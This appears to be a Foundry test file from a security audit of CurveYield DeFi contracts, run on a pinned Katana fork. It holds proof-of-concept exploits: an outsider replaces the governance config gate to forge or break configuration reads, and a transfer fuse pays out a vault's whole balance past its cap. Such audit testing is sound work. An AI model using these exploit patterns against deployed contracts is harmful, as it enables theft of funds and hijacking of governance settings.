// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

// Attacker-owned fork regression. Imports unmodified SHA256-admitted production contracts.
import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {CurveYieldGateConfig, ICurveYieldConfigGate} from "../../src/governance/CurveYieldGateConfig.sol";
import {CurveYieldAllocationController} from "../../src/allocation/CurveYieldAllocationController.sol";
import {
    CurveYieldErc20TransferFuse,
    CurveYieldErc20TransferFuseEnterData
} from "../../src/generic/CurveYieldErc20TransferFuse.sol";
import {CurveYieldSubstrateLib as Sub} from "../../src/libraries/CurveYieldSubstrateLib.sol";
import {PlasmaVaultConfigLib} from "contracts/libraries/PlasmaVaultConfigLib.sol";

contract AttackerTestGate is ICurveYieldConfigGate {
    uint256 public immutable VALUE;
    constructor(uint256 value_) { VALUE = value_; }
    function getMany(bytes32[] calldata keys) external view returns (uint256[] memory out) {
        out = new uint256[](keys.length);
        for (uint256 i; i < keys.length; ++i) out[i] = VALUE;
    }
    function addr(bytes32) external pure returns (address) { return address(0xFEE1); }
    function adminReceiver() external pure returns (address) { return address(0xFEE1); }
}
contract AttackerTestToken is ERC20 {
    constructor() ERC20("Audit Test", "ATST") {}
    function mint(address who, uint256 amount) external { _mint(who, amount); }
}
contract AttackerFuseExecutionVault {
    CurveYieldErc20TransferFuse public immutable FUSE;
    constructor(CurveYieldErc20TransferFuse fuse_) { FUSE = fuse_; }

    // A test-only stand-in for governance's ordinary substrate grant, in vault storage.
    function grant(address token, address recipient, uint256 cap) external {
        bytes32[] memory subs = new bytes32[](3);
        subs[0] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, token);
        subs[1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, recipient);
        subs[2] = Sub.encodeCap(token, cap);
        PlasmaVaultConfigLib.grantMarketSubstrates(Sub.CONFIG_MARKET, subs);
    }
    function transferByFuse(address token, address recipient, uint256 requested) external returns (uint256 sent) {
        (bool ok, bytes memory ret) = address(FUSE).delegatecall(abi.encodeWithSelector(
            CurveYieldErc20TransferFuse.enter.selector,
            CurveYieldErc20TransferFuseEnterData(token, recipient, requested)
        ));
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        sent = abi.decode(ret, (uint256));
    }
}
contract AttackerForkConformance_v1 is Test {
    address constant OUTSIDER = address(0xA77AC);
    address constant APPROVED_RECIPIENT = address(0xA1100);
    uint256 constant PINNED_KATANA_BLOCK = 45121798;

    function setUp() public {
        assertEq(block.chainid, 747474, "Use verified Katana fork, never production broadcast");
        assertEq(block.number, PINNED_KATANA_BLOCK, "Fork must be pinned for evidence binding");
    }
    function test_OUTSIDER_canReplaceInheritedGovernanceGate() public {
        AttackerTestGate genuine = new AttackerTestGate(500);
        AttackerTestGate hostile = new AttackerTestGate(9500);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 500, "healthy gate");
        assertEq(target.owner(), address(this), "controller has separate authorized owner");
        vm.prank(OUTSIDER);
        target.setConfigGate(address(hostile));
        assertEq(target.configGate(), address(hostile), "outsider changed active gate");
        assertEq(target.vaultFloorBps(), 9500, "outsider controls live economic config read");
        assertEq(target.owner(), address(this), "ownership did not change");
        emit log_string("CONFIRMED_UNPRIVILEGED_GATE_REPLACEMENT");
        emit log_named_address("outsider", OUTSIDER);
        emit log_named_address("malicious_configGate", target.configGate());
        emit log_named_uint("forged_vault_floor_bps", target.vaultFloorBps());
    }
    function test_OUTSIDER_canBreakConfigReadsViaNoCodeGate() public {
        AttackerTestGate genuine = new AttackerTestGate(200);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 200);
        vm.prank(OUTSIDER);
        target.setConfigGate(address(0xDEAD));
        assertEq(target.configGate(), address(0xDEAD));
        vm.expectRevert();
        target.vaultFloorBps();
        emit log_string("CONFIRMED_OUTSIDER_GATE_SETTER_CAN_CAUSE_VIEW_DOS");
    }
    function test_GRANTED_FUSE_transfersEntireBalanceDespiteSmallCap() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        uint256 inventory = 1_000 ether;
        uint256 requested = 1 ether;
        uint256 cap = 10 ether;
        vault.grant(address(token), APPROVED_RECIPIENT, cap);
        token.mint(address(vault), inventory);
        uint256 sent = vault.transferByFuse(address(token), APPROVED_RECIPIENT, requested);
        assertEq(sent, inventory, "fuse sends full vault balance, not requested amount");
        assertGt(sent, cap, "actual payout bypasses granted per-call cap");
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(APPROVED_RECIPIENT), inventory);
        emit log_string("CONFIRMED_FUSE_BALANCE_OVERPAYMENT");
        emit log_named_uint("requested", requested);
        emit log_named_uint("cap", cap);
        emit log_named_uint("actual_sent", sent);
    }
    function test_GRANTED_FUSE_revertsWhenRequestedExceedsBalance() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 1 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), APPROVED_RECIPIENT, 5 ether);
        assertEq(token.balanceOf(address(vault)), 1 ether);
        emit log_string("CONFIRMED_FUSE_UNDERFUNDED_REQUEST_REVERT");
    }
    function test_FUSE_stillEnforcesRecipientSubstrate() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 100 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), OUTSIDER, 1 ether);
        assertEq(token.balanceOf(OUTSIDER), 0);
        emit log_string("NEGATIVE_CONTROL_UNGRANTED_RECIPIENT_BLOCKED");
    }
}
